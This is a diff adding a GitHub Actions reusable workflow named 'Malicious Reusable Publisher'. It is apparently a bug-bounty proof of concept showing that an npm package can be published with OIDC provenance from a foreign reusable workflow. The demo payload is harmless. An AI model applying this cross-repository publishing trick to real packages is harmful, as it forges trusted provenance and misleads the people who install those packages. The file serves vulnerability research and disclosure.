@@ -1,0 +1,36 @@
+name: Malicious Reusable Publisher
+on:
+  workflow_call:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup evil package
+        run: |
+          mkdir -p /tmp/pub
+          cat > /tmp/pub/package.json << 'PKGEOF'
+          {
+            "name": "@giga-gap-bb/h4-oidc-test",
+            "version": "1.0.3",
+            "description": "H4 DECISIVE TEST - published via cross-repo reusable workflow (job_workflow_ref NOT checked by npm)",
+            "license": "MIT",
+            "repository": {
+              "type": "git",
+              "url": "git+https://github.com/giga-gap-bb/bb-test-repo.git"
+            },
+            "publishConfig": {
+              "registry": "https://registry.npmjs.org/"
+            }
+          }
+          PKGEOF
+          echo "console.log('cross-repo pub');" > /tmp/pub/index.js
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          registry-url: 'https://registry.npmjs.org/'
+      - run: npm install -g npm@latest
+      - name: Publish via OIDC from foreign reusable
+        run: cd /tmp/pub && npm publish --access public --provenance
